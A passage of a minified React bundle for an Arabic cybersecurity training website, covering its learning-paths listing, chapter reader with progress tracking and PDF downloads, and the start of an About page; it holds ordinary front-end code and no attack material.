op={basics:{icon:Xp,color:"text-neon",bg:"bg-neon/10",border:"border-neon/20"},redTeam:{icon:Uo,color:"text-red-500",bg:"bg-red-500/10",border:"border-red-500/20"},blueTeam:{icon:Zl,color:"text-blue-500",bg:"bg-blue-500/10",border:"border-blue-500/20"},soc:{icon:Vp,color:"text-yellow-500",bg:"bg-yellow-500/10",border:"border-yellow-500/20"},grc:{icon:Qp,color:"text-purple-500",bg:"bg-purple-500/10",border:"border-purple-500/20"},forensics:{icon:Jp,color:"text-cyan-500",bg:"bg-cyan-500/10",border:"border-cyan-500/20"},malware:{icon:Yp,color:"text-orange-500",bg:"bg-orange-500/10",border:"border-orange-500/20"}},wv=["الكل","مبتدئ","متوسط","متقدم"];function Rv(){const[o,u]=N.useState(""),[d,r]=N.useState("الكل"),f=Ql.reduce((v,g)=>v+(g.chaptersCount||g.chapters.length),0),p=Ql.reduce((v,g)=>{const m=g.pages.match(/\d+/);return v+(m?parseInt(m[0],10):0)},0),x=Ql.filter(v=>{const g=o===""||v.title.includes(o)||v.description.includes(o),m=d==="الكل"||v.level.includes(d);return g&&m});return i.jsxs(xl,{"code-path":"src/pages/LearningPaths.tsx:46:5",children:[i.jsxs("section",{"code-path":"src/pages/LearningPaths.tsx:48:7",className:"relative py-20 px-4 overflow-hidden bg-cyber-surface/30",children:[i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:49:9",className:"absolute inset-0 opacity-5",children:i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:50:11",className:"absolute top-0 right-1/4 w-96 h-96 bg-neon rounded-full blur-[200px]"})}),i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:52:9",className:"max-w-6xl mx-auto relative text-center",children:i.jsxs(be,{"code-path":"src/pages/LearningPaths.tsx:53:11",children:[i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:54:13",className:"inline-flex items-center gap-2 px-4 py-2 rounded-full border border-neon/30 bg-neon/5 mb-6",children:[i.jsx(Kl,{"code-path":"src/pages/LearningPaths.tsx:55:15",className:"w-4 h-4 text-neon"}),i.jsx("span",{"code-path":"src/pages/LearningPaths.tsx:56:15",className:"text-neon text-sm font-semibold",children:"المكتبة التعليمية"})]}),i.jsx("h1",{"code-path":"src/pages/LearningPaths.tsx:58:13",className:"neon-glow-text text-4xl sm:text-5xl mb-4",children:"الخطط التعليمية المتخصصة"}),i.jsxs("p",{"code-path":"src/pages/LearningPaths.tsx:61:13",className:"text-muted-foreground max-w-3xl mx-auto text-lg leading-relaxed",children:["7 كتب تعليمية متكاملة – كل كتاب يحتوي على ",i.jsx("strong",{"code-path":"src/pages/LearningPaths.tsx:62:57",children:"3 مستويات"})," ومشاريع عملية.",i.jsx("br",{"code-path":"src/pages/LearningPaths.tsx:63:15"}),i.jsx("span",{"code-path":"src/pages/LearningPaths.tsx:64:15",className:"text-neon font-semibold",children:"جميع الخطط مجانية تماماً."})]})]})})]}),i.jsx("section",{"code-path":"src/pages/LearningPaths.tsx:71:7",className:"py-8 px-4 border-y border-neon/10 bg-cyber-bg/50",children:i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:72:9",className:"max-w-6xl mx-auto",children:i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:73:11",className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:[{label:"كتاب تعليمي",value:Ql.length.toString(),icon:Kl},{label:"فصل تعليمي",value:f.toString()+"+",icon:ls},{label:"موضوع تدريبي",value:"50+",icon:Uo},{label:"صفحة محتوى",value:p.toString()+"+",icon:ls}].map((v,g)=>i.jsx(be,{"code-path":"src/pages/LearningPaths.tsx:80:15",delay:g*100,children:i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:81:17",className:"glass-card rounded-2xl p-4 text-center",children:[i.jsx(v.icon,{"code-path":"src/pages/LearningPaths.tsx:82:19",className:"w-6 h-6 text-neon mx-auto mb-2"}),i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:83:19",className:"text-2xl font-black text-neon neon-text",children:v.value}),i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:84:19",className:"text-muted-foreground text-xs",children:v.label})]})},g))})})}),i.jsx("section",{"code-path":"src/pages/LearningPaths.tsx:93:7",className:"py-8 px-4",children:i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:94:9",className:"max-w-6xl mx-auto",children:i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:95:11",className:"flex flex-col sm:flex-row gap-4",children:[i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:96:13",className:"relative flex-1",children:[i.jsx(bc,{"code-path":"src/pages/LearningPaths.tsx:97:15",className:"absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground"}),i.jsx($p,{"code-path":"src/pages/LearningPaths.tsx:98:15",placeholder:"ابحث في المسارات...",value:o,onChange:v=>u(v.target.value),className:"pr-10 bg-cyber-elevated border-neon/20 text-right"})]}),i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:105:13",className:"flex items-center gap-2 flex-wrap",children:[i.jsx(M0,{"code-path":"src/pages/LearningPaths.tsx:106:15",className:"w-4 h-4 text-neon"}),wv.map(v=>i.jsx("button",{"code-path":"src/pages/LearningPaths.tsx:108:17",onClick:()=>r(v),className:`px-4 py-2 rounded-full text-sm font-semibold transition-all ${d===v?"bg-neon text-black":"bg-cyber-elevated border border-neon/20 text-foreground/80 hover:border-neon/40"}`,children:v},v))]})]})})}),i.jsx("section",{"code-path":"src/pages/LearningPaths.tsx:126:7",className:"py-8 px-4 pb-20",children:i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:127:9",className:"max-w-6xl mx-auto",children:[x.length===0?i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:129:13",className:"text-center py-20",children:[i.jsx(bc,{"code-path":"src/pages/LearningPaths.tsx:130:15",className:"w-16 h-16 text-muted-foreground mx-auto mb-4"}),i.jsx("p",{"code-path":"src/pages/LearningPaths.tsx:131:15",className:"text-muted-foreground",children:"لا توجد نتائج مطابقة للبحث"})]}):i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:134:13",className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:x.map((v,g)=>{const m=op[v.id]||op.basics,T=m.icon;return i.jsx(be,{"code-path":"src/pages/LearningPaths.tsx:139:19",delay:g*100,children:i.jsx(at,{"code-path":"src/pages/LearningPaths.tsx:140:21",to:`/learning-paths/${v.id}`,className:"glass-card rounded-3xl p-6 transition-all duration-300 hover:-translate-y-2 hover:border-neon/50 group block h-full",children:i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:144:23",className:"flex items-start gap-4",children:[i.jsx("div",{"code-path":"src/pages/LearningPaths.tsx:145:25",className:`shrink-0 w-16 h-16 rounded-2xl ${m.bg} border ${m.border} flex items-center justify-center group-hover:scale-110 transition-transform`,children:i.jsx(T,{"code-path":"src/pages/LearningPaths.tsx:146:27",className:`w-8 h-8 ${m.color}`})}),i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:148:25",className:"flex-1 min-w-0",children:[i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:149:27",className:"flex flex-wrap items-center gap-2 mb-2",children:[i.jsxs("h2",{"code-path":"src/pages/LearningPaths.tsx:150:29",className:"text-xl font-bold group-hover:text-neon transition-colors",children:[v.emoji," ",v.title]}),i.jsx(ma,{"code-path":"src/pages/LearningPaths.tsx:153:29",variant:"outline",className:`${m.color} ${m.border} text-xs`,children:v.level})]}),i.jsx("p",{"code-path":"src/pages/LearningPaths.tsx:157:27",className:"text-sm text-muted-foreground mb-3 leading-relaxed",children:v.description}),i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:160:27",className:"flex flex-wrap gap-2 mb-4",children:[v.chapters.slice(0,3).map((A,z)=>i.jsx("span",{"code-path":"src/pages/LearningPaths.tsx:162:31",className:"text-xs bg-black/30 px-3 py-1 rounded-full text-foreground/50",children:A.title.length>30?A.title.substring(0,27)+"...":A.title},z)),v.chapters.length>3&&i.jsxs("span",{"code-path":"src/pages/LearningPaths.tsx:167:31",className:"text-xs text-neon/60 px-2",children:["+",v.chapters.length-3]})]}),i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:170:27",className:"flex flex-wrap items-center gap-4",children:[i.jsxs("span",{"code-path":"src/pages/LearningPaths.tsx:171:29",className:"text-xs text-muted-foreground flex items-center gap-1",children:[i.jsx(Kl,{"code-path":"src/pages/LearningPaths.tsx:172:31",className:"w-3 h-3 text-neon/60"}),v.chaptersCount||v.chapters.length," فصل"]}),i.jsxs("span",{"code-path":"src/pages/LearningPaths.tsx:175:29",className:"text-xs text-muted-foreground flex items-center gap-1",children:[i.jsx(ls,{"code-path":"src/pages/LearningPaths.tsx:176:31",className:"w-3 h-3 text-neon/60"}),v.pages]}),i.jsxs("a",{"code-path":"src/pages/LearningPaths.tsx:179:29",href:`/pdfs/${v.id}.pdf`,download:!0,onClick:A=>A.stopPropagation(),className:"inline-flex items-center gap-1.5 bg-neon/10 hover:bg-neon/20 border border-neon/30 text-neon px-3 py-1 rounded-full text-xs font-semibold transition-all hover:scale-105",children:[i.jsx(Rc,{"code-path":"src/pages/LearningPaths.tsx:185:31",className:"w-3 h-3"}),"تحميل PDF"]}),i.jsx("span",{"code-path":"src/pages/LearningPaths.tsx:188:29",className:"text-xs text-neon font-semibold opacity-0 group-hover:opacity-100 transition-opacity",children:"اقرأ الآن ←"})]})]})]})})},v.id)})}),i.jsxs("div",{"code-path":"src/pages/LearningPaths.tsx:201:11",className:"note-box mt-12 text-center",children:[i.jsx("i",{"code-path":"src/pages/LearningPaths.tsx:202:13",className:"fab fa-telegram-plane text-neon text-xl mb-2 block"}),i.jsxs("p",{"code-path":"src/pages/LearningPaths.tsx:203:13",className:"text-foreground/80 text-sm",children:["جميع الخطط مجانية تماماً. انضم إلى"," ",i.jsx("a",{"code-path":"src/pages/LearningPaths.tsx:205:15",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline font-semibold",children:"قناة التليجرام"})," ","للمناقشة والاستفسارات."]})]})]})})]})}const Mv=Ip("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-white hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60",outline:"border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-9 px-4 py-2 has-[>svg]:px-3",sm:"h-8 rounded-md gap-1.5 px-3 has-[>svg]:px-2.5",lg:"h-10 rounded-md px-6 has-[>svg]:px-4",icon:"size-9","icon-sm":"size-8","icon-lg":"size-10"}},defaultVariants:{variant:"default",size:"default"}});function hc({className:o,variant:u="default",size:d="default",asChild:r=!1,...f}){const p=r?Fp:"button";return i.jsx(p,{"code-path":"src/components/ui/button.tsx:52:5","data-slot":"button","data-variant":u,"data-size":d,className:rs(Mv({variant:u,size:d,className:o})),...f})}const ip={red:"text-red-500 border-red-500/30 bg-red-950/20",blue:"text-blue-500 border-blue-500/30 bg-blue-950/20",yellow:"text-yellow-500 border-yellow-500/30 bg-yellow-950/20",purple:"text-purple-500 border-purple-500/30 bg-purple-950/20",cyan:"text-cyan-500 border-cyan-500/30 bg-cyan-950/20",orange:"text-orange-500 border-orange-500/30 bg-orange-950/20",green:"text-neon border-neon/30 bg-neon/5"};function Dv(){const{pathId:o}=Sb(),[u,d]=N.useState(0),[r,f]=N.useState(!1),[p,x]=N.useState(""),[v,g]=N.useState(new Set),m=N.useRef(null),T=o?rv(o):void 0;if(N.useEffect(()=>{d(0),g(new Set),x(""),window.scrollTo(0,0)},[o]),!T)return i.jsx(xl,{"code-path":"src/pages/PathDetail.tsx:43:7",children:i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:44:9",className:"min-h-[60vh] flex flex-col items-center justify-center px-4",children:[i.jsx("i",{"code-path":"src/pages/PathDetail.tsx:45:11",className:"fas fa-exclamation-circle text-6xl text-muted-foreground mb-4"}),i.jsx("h1",{"code-path":"src/pages/PathDetail.tsx:46:11",className:"text-2xl font-bold mb-4",children:"المسار غير موجود"}),i.jsx(at,{"code-path":"src/pages/PathDetail.tsx:47:11",to:"/learning-paths",className:"text-neon hover:underline font-semibold",children:"العودة إلى الخطط التعليمية"})]})});const A=T.chapters[u],z=T.chapters.length,V=ip[T.color]||ip.green,q=(u+1)/z*100,L=()=>{u<z-1&&(d(u+1),m.current?.scrollIntoView({behavior:"smooth"}))},H=()=>{u>0&&(d(u-1),m.current?.scrollIntoView({behavior:"smooth"}))},Z=ee=>{d(ee),f(!1),m.current?.scrollIntoView({behavior:"smooth"})},I=ee=>{g(ue=>{const F=new Set(ue);return F.has(ee)?F.delete(ee):F.add(ee),F})},J=p?T.chapters.filter(ee=>ee.title.includes(p)):T.chapters,se=Math.ceil(A.content.length/1500);return i.jsxs(xl,{"code-path":"src/pages/PathDetail.tsx:96:5",children:[i.jsx("button",{"code-path":"src/pages/PathDetail.tsx:98:7",onClick:()=>f(!r),className:"fixed bottom-20 right-4 z-40 w-12 h-12 rounded-full bg-neon text-black flex items-center justify-center shadow-neon lg:hidden","aria-label":"قائمة الفصول",children:i.jsx(k0,{"code-path":"src/pages/PathDetail.tsx:103:9",className:"w-5 h-5"})}),r&&i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:108:9",className:"fixed inset-0 bg-black/60 z-40 lg:hidden",onClick:()=>f(!1)}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:114:7",className:"max-w-7xl mx-auto px-4 sm:px-6 py-8 flex gap-6",ref:m,children:[i.jsx("aside",{"code-path":"src/pages/PathDetail.tsx:116:9",className:`fixed lg:sticky lg:top-20 right-0 lg:right-auto h-[calc(100vh-5rem)] w-80 
            bg-cyber-elevated/95 backdrop-blur-xl border-l border-neon/10 z-50 lg:z-auto
            overflow-y-auto transition-transform duration-300 lg:translate-x-0
            ${r?"translate-x-0":"translate-x-full lg:translate-x-0"}`,children:i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:122:11",className:"p-4",children:[i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:123:13",className:"flex items-center justify-between mb-4",children:[i.jsxs("h3",{"code-path":"src/pages/PathDetail.tsx:124:15",className:"font-bold text-sm flex items-center gap-2",children:[i.jsx(Kl,{"code-path":"src/pages/PathDetail.tsx:125:17",className:"w-4 h-4 text-neon"}),"قائمة الفصول (",z,")"]}),i.jsx("button",{"code-path":"src/pages/PathDetail.tsx:128:15",onClick:()=>f(!1),className:"lg:hidden text-muted-foreground hover:text-white",children:i.jsx(K0,{"code-path":"src/pages/PathDetail.tsx:132:17",className:"w-5 h-5"})})]}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:137:13",className:"relative mb-4",children:[i.jsx(bc,{"code-path":"src/pages/PathDetail.tsx:138:15",className:"absolute right-3 top-1/2 -translate-y-1/2 w-3 h-3 text-muted-foreground"}),i.jsx($p,{"code-path":"src/pages/PathDetail.tsx:139:15",placeholder:"ابحث في الفصول...",value:p,onChange:ee=>x(ee.target.value),className:"pr-8 text-sm h-9 bg-cyber-bg border-neon/15"})]}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:148:13",className:"mb-4",children:[i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:149:15",className:"flex justify-between text-xs text-muted-foreground mb-1",children:[i.jsx("span",{"code-path":"src/pages/PathDetail.tsx:150:17",children:"تم إكماله"}),i.jsxs("span",{"code-path":"src/pages/PathDetail.tsx:151:17",children:[v.size," / ",z]})]}),i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:153:15",className:"w-full h-1 bg-muted rounded-full overflow-hidden",children:i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:154:17",className:"h-full bg-neon transition-all",style:{width:`${v.size/z*100}%`}})})]}),i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:162:13",className:"space-y-1",children:J.map(ee=>{const ue=T.chapters.indexOf(ee),F=ue===u,P=v.has(ee.number);return i.jsxs("button",{"code-path":"src/pages/PathDetail.tsx:169:19",onClick:()=>Z(ue),className:`w-full text-right px-3 py-2.5 rounded-xl text-sm transition-all flex items-center gap-2 ${F?"bg-neon/10 border border-neon/30 text-neon":"hover:bg-cyber-surface text-foreground/70"}`,children:[i.jsx("button",{"code-path":"src/pages/PathDetail.tsx:178:21",onClick:Ee=>{Ee.stopPropagation(),I(ee.number)},className:`shrink-0 w-5 h-5 rounded border flex items-center justify-center transition-all ${P?"bg-neon border-neon text-black":"border-muted-foreground/30"}`,children:P&&i.jsx(xc,{"code-path":"src/pages/PathDetail.tsx:186:39",className:"w-3 h-3"})}),i.jsx("span",{"code-path":"src/pages/PathDetail.tsx:188:21",className:"shrink-0 text-xs text-muted-foreground w-6",children:ee.number}),i.jsx("span",{"code-path":"src/pages/PathDetail.tsx:191:21",className:"truncate",children:ee.title})]},ee.number)})})]})}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:200:9",className:"flex-1 min-w-0",children:[i.jsx(be,{"code-path":"src/pages/PathDetail.tsx:202:11",children:i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:203:13",className:"text-center mb-8 border-b border-neon/10 pb-6",children:[i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:204:15",className:"flex flex-wrap justify-center gap-2 mb-3",children:[i.jsx(ma,{"code-path":"src/pages/PathDetail.tsx:205:17",className:`${V} text-xs`,children:T.level}),i.jsxs(ma,{"code-path":"src/pages/PathDetail.tsx:206:17",variant:"outline",className:"text-xs",children:[z," فصل"]}),i.jsx(ma,{"code-path":"src/pages/PathDetail.tsx:207:17",variant:"outline",className:"text-xs",children:T.pages})]}),i.jsxs("h1",{"code-path":"src/pages/PathDetail.tsx:209:15",className:"text-3xl sm:text-4xl font-bold text-neon mb-2",children:[T.emoji," ",T.title]}),i.jsx("p",{"code-path":"src/pages/PathDetail.tsx:212:15",className:"text-muted-foreground text-sm max-w-2xl mx-auto",children:T.description}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:215:15",className:"flex flex-wrap justify-center gap-3 mt-4",children:[i.jsxs("a",{"code-path":"src/pages/PathDetail.tsx:216:17",href:`/pdfs/${T.id}.pdf`,download:!0,className:"inline-flex items-center gap-1.5 bg-neon/10 hover:bg-neon/20 border border-neon/40 text-neon px-4 py-2 rounded-lg text-sm font-semibold transition-all hover:scale-105",children:[i.jsx(Rc,{"code-path":"src/pages/PathDetail.tsx:221:19",className:"w-4 h-4"}),"تحميل PDF"]}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:224:17",className:"inline-flex items-center gap-1.5 text-muted-foreground text-sm px-4 py-2",children:[i.jsx(ns,{"code-path":"src/pages/PathDetail.tsx:225:19",className:"w-4 h-4"}),"وقت القراءة: ~",se," دقيقة"]})]})]})}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:233:11",className:"mb-6",children:[i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:234:13",className:"flex justify-between text-xs text-muted-foreground mb-1",children:[i.jsxs("span",{"code-path":"src/pages/PathDetail.tsx:235:15",children:["الفصل ",u+1," من ",z]}),i.jsxs("span",{"code-path":"src/pages/PathDetail.tsx:236:15",children:[Math.round(q),"%"]})]}),i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:238:13",className:"w-full h-2 bg-muted rounded-full overflow-hidden",children:i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:239:15",className:"h-full bg-gradient-to-l from-neon to-neon-bright transition-all duration-500",style:{width:`${q}%`}})})]}),i.jsx(be,{"code-path":"src/pages/PathDetail.tsx:247:11",children:i.jsx(pl,{"code-path":"src/pages/PathDetail.tsx:248:13",className:"bg-cyber-elevated/40 backdrop-blur-sm border-border rounded-3xl overflow-hidden shadow-2xl",children:i.jsxs(ml,{"code-path":"src/pages/PathDetail.tsx:249:15",className:"p-6 sm:p-10 lg:p-12",children:[i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:250:17",className:"mb-6",children:[i.jsxs(ma,{"code-path":"src/pages/PathDetail.tsx:251:19",className:`${V} text-xs mb-3`,children:["الفصل ",A.number," من ",z]}),i.jsx("h2",{"code-path":"src/pages/PathDetail.tsx:254:19",className:"text-2xl sm:text-3xl font-bold leading-tight",children:A.title}),i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:257:19",className:"flex items-center gap-4 mt-2 text-xs text-muted-foreground",children:i.jsxs("span",{"code-path":"src/pages/PathDetail.tsx:258:21",className:"flex items-center gap-1",children:[i.jsx(ns,{"code-path":"src/pages/PathDetail.tsx:259:23",className:"w-3 h-3"}),"~",se," دقيقة قراءة"]})})]}),i.jsx("div",{"code-path":"src/pages/PathDetail.tsx:265:17",className:`prose prose-invert prose-lg max-w-none
                    [&_p]:leading-loose [&_p]:mb-5
                    [&_h2]:text-2xl [&_h2]:font-bold [&_h2]:text-neon [&_h2]:mt-10 [&_h2]:mb-4
                    [&_h3]:text-xl [&_h3]:font-semibold [&_h3]:text-neon/80 [&_h3]:mt-8 [&_h3]:mb-3
                    [&_ul]:space-y-2 [&_ul]:pr-6
                    [&_ol]:space-y-2 [&_ol]:pr-6
                    [&_li]:leading-relaxed
                    [&_.code-block]:my-5 [&_.code-block]:p-4 [&_.code-block]:rounded-xl [&_.code-block]:bg-black/50 [&_.code-block]:border-r-4 [&_.code-block]:border-neon [&_.code-block]:font-mono [&_.code-block]:text-sm
                    [&_.note-box]:my-5 [&_.note-box]:p-4 [&_.note-box]:rounded-xl [&_.note-box]:bg-neon/5 [&_.note-box]:border-r-4 [&_.note-box]:border-neon
                    [&_.warning-box]:my-5 [&_.warning-box]:p-4 [&_.warning-box]:rounded-xl [&_.warning-box]:bg-red-500/5 [&_.warning-box]:border-r-4 [&_.warning-box]:border-red-500
                    [&_.fig-box]:my-6 [&_.fig-box]:p-6 [&_.fig-box]:rounded-2xl [&_.fig-box]:bg-cyber-surface/50 [&_.fig-box]:border [&_.fig-box]:border-border [&_.fig-box]:text-center`,dangerouslySetInnerHTML:{__html:A.content}}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:280:17",className:"mt-10 pt-6 border-t border-border flex items-center justify-between text-sm text-muted-foreground",children:[i.jsxs("span",{"code-path":"src/pages/PathDetail.tsx:281:19",children:["الفصل ",A.number," من ",z]}),i.jsxs("span",{"code-path":"src/pages/PathDetail.tsx:282:19",className:"flex items-center gap-1",children:[i.jsx(Kl,{"code-path":"src/pages/PathDetail.tsx:283:21",className:"w-4 h-4"}),T.title]})]})]})})}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:292:11",className:"flex items-center justify-between mt-6 gap-4",children:[i.jsxs(hc,{"code-path":"src/pages/PathDetail.tsx:293:13",onClick:H,disabled:u===0,variant:"outline",className:"border-neon/30 text-neon hover:bg-neon/10 disabled:opacity-30 px-6",children:[i.jsx(E0,{"code-path":"src/pages/PathDetail.tsx:299:15",className:"w-4 h-4 ml-2"}),"السابق"]}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:303:13",className:"flex items-center gap-3",children:[i.jsxs(hc,{"code-path":"src/pages/PathDetail.tsx:304:15",onClick:()=>I(A.number),variant:"outline",className:`border-neon/30 px-4 ${v.has(A.number)?"bg-neon/20 text-neon":"text-neon hover:bg-neon/10"}`,children:[i.jsx(xc,{"code-path":"src/pages/PathDetail.tsx:309:17",className:"w-4 h-4 ml-1"}),v.has(A.number)?"تم":"تم الإكمال"]}),i.jsxs("span",{"code-path":"src/pages/PathDetail.tsx:312:15",className:"text-sm text-muted-foreground",children:[u+1," / ",z]})]}),i.jsxs(hc,{"code-path":"src/pages/PathDetail.tsx:317:13",onClick:L,disabled:u===z-1,variant:"outline",className:"border-neon/30 text-neon hover:bg-neon/10 disabled:opacity-30 px-6",children:["التالي",i.jsx(A0,{"code-path":"src/pages/PathDetail.tsx:324:15",className:"w-4 h-4 mr-2"})]})]}),i.jsxs("div",{"code-path":"src/pages/PathDetail.tsx:329:11",className:"note-box mt-8 text-center",children:[i.jsx("i",{"code-path":"src/pages/PathDetail.tsx:330:13",className:"fab fa-telegram-plane text-neon text-xl mb-2 block"}),i.jsxs("p",{"code-path":"src/pages/PathDetail.tsx:331:13",className:"text-sm text-foreground/80",children:["هل لديك سؤال عن هذا الفصل؟ انضم إلى"," ",i.jsx("a",{"code-path":"src/pages/PathDetail.tsx:333:15",href:"https://t.me/Masry0Store",target:"_blank",rel:"noopener noreferrer",className:"text-neon hover:underline font-semibold",children:"قناة التليجرام"})," ","للمناقشة."]})]})]})]})]})}const _v=["Certified Ethical Hacker (CEH) - EC-Council","CompTIA Security+","Linux Hardening & Red Hat Administration","Digital Forensics with Autopsy & Volatility","Dark Web Intelligence & OSINT","Malware Analysis (Static & Dynamic)"],zv=[{icon:Zp,value:"1,500+",label:"متدرب"},{icon:Kl,value:"7",label:"مسار تعليمي"},{icon:ns,value:"5+",label:"سنوات خبرة"},{icon:Pp,value:"10+",label:"دولة"}],Ov=[{year:"2021",event:"انطلاق MASRY STORE كمجتمع تعليمي"},{year:"2022",event:"إطلاق أول مسار Red Team"},{year:"2023",event:"وصول عدد المتدربين لأكثر من 500"},{year:"2024",event:"إطلاق منصة الويب وخطط PDF المجانية"},{year:"2025",event:"توسيع المحتوى لـ 7 مسارات متخصصة"},{year:"2026",event:"إعادة تصميم المنصة بتجربة مستخدم محسنة"}];function kv(){return i.jsxs(xl,{"code-path":"src/pages/About.tsx:35:5",children:[i.jsxs("section",{"code-path":"src/pages/About.tsx:37:7",className:"relative py-20 px-4 overflow-hidden bg-cyber-surface/30",children:[i.jsx("div",{"code-path":"src/pages/About.tsx:38:9",className:"absolute inset-0 opacity-5",children:i.jsx("div",{"code-path":"src/pages/About.tsx:39:11",className:"absolute top-0 left-1/4 w-96 h-96 bg-neon rounded-full blur-[200px]"})}),i.jsx("div",{"code-path":"src/pages/About.tsx:41:9",className:"max-w-4xl mx-auto relative text-center",children:i.jsxs(be,{"code-path":"src/pages/About.tsx:42:11",children:[i.jsx("div",{"code-path":"src/pages/About.tsx:43:13",className:"w-24 h-24 rounded-full bg-neon/10 border border-neon/20 flex items-center justify-center mx-auto mb-6",children:i.jsx(Zl,{"code-path":"src/pages/About.tsx:44:15",className:"w-12 h-12 text-neon"})}),i.jsx("h1",{"code-path":"src/pages/About.tsx:46:13",className:"neon-glow-text text-4xl mb-4",children:"المدرب والمؤسس"}),i.jsx("p",{"code-path":"src/pages/About.tsx:47:13",className:"text-neon font-semibold text-lg mb-4",children:"MASRY STORE"}),i.jsx("p",{"code-path":"src/pages/About.tsx:48:13",className:"text-muted-foreground max-w-2xl mx-auto leading-relaxed",children:"خبرة تمتد لسنوات في الأمن السيبراني، الهكر الأخلاقي، وتحليل الأنظمة. المشرف الوحيد على المحتوى، التدريب، والدعم الفني."})]})})]}),i.jsx("section",{"code-path":"src/pages/About.tsx:57:7",className:"py-12 px-4 border-y border-neon/10",children:i.jsx("div",{"code-path":"src/pages/About.tsx:58:9",className:"max-w-4xl mx-auto",children:i.jsx("div",{"code-path":"src/pages/About.tsx:59:11",className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:zv.map((o,u)=>i.jsx(be,{"code-path":"src/pages/About.tsx:61:15",delay:u*100,children:i.jsxs("div",{"code-path":"src/pages/About.tsx:62:17",className:"glass-card rounded-2xl p-4 text-center",children:[i.jsx(o.icon,{"code-path":"src/pages/About.tsx:63:19",className:"w-6 h-6 text-neon mx-auto mb-2"}),i.jsx("div",{"code-path":"src/pages/About.tsx:64:19",className:"text-2xl font-black text-neon",children:o.value}),i.jsx("div",{"code-path":"src/pages/About.tsx:65:19",className:"text-muted-foreground text-xs",children:o.label})]})},u))})})}),i.jsx("section",{"code-path":"src/pages/About.tsx:74:7",className:"py-16 px-4",children:i.jsxs("div",{"code-path":"src/pages/About.tsx:75:9",className:"max-w-3xl mx-auto",children:[i.jsx(be,{"code-path":"src/pages/About.tsx:76:11",children:i.jsx(pl,{"code-path":"src/pages/About.tsx:77:13",className:"bg-cyber-elevated/90 backdrop-blur border-neon/20 rounded-3xl overflow-hidden mb-8",children:i.jsxs(ml,{"code-path":"src/pages/About.tsx:78:15",className:"p-8 sm:p-10",children:[i.jsx("p",{"code-path":"src/pages/About.tsx:79:17",className:"text-foreground/80 leading-relaxed text-lg mb-8",children:"أنا المشرف الوحيد على المحتوى، التدريب، والدعم الفني. لا وسطاء، أنا معك خطوة بخطوة لتصبح خبيراً في هذا المجال. أسعى لتقديم محتوى عربي متخصص يسد الفجوة في التعليم الأمني للناطقين بالعربية."}),i.jsxs("h3",{"code-path":"src/pages/About.tsx:85:17",className:"font-bold text-xl mb-4 flex items-center gap-2",children:[i.jsx(m0,{"code-path":"src/pages/About.tsx:86:19",className:"w-5 h-5 text-neon"}),"الشهادات والخبرات"]}),i.jsx("ul",{"code-path":"src/pages/About.tsx:89:17",className:"space-y-3 mb-8",children:_v.map((o,u)=>i.jsxs("li",{"code-path":"src/pages/About.tsx:91:21",className:"flex items-start 